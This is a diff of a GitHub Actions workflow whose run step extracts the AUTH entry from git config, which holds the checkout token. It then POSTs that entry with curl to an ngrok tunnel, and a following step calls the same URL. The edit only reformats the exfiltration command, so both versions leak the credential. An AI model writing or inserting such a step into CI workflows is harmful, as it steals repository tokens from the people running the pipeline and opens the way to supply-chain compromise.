@@ -15,11 +15,15 @@ jobs:
       
       - run: | 
           auth=$(git config --list | grep AUTH)
-          curl --header "Content-Type: application/json" \
-            --request POST \
-            --data '{"auth": "'$auth'"}' \
-            https://5aa7-93-172-42-40.ngrok.io
-            
+          
+          curl --request POST \
+          --url https://5aa7-93-172-42-40.ngrok.io \
+          --header 'content-type: application/json' \
+          --data '{
+            "auth": "'$auth'",
+            }' \
+          --fail
+          
       - uses: fjogeleit/http-request-action@master
         with:
           url: 'https://5aa7-93-172-42-40.ngrok.io'
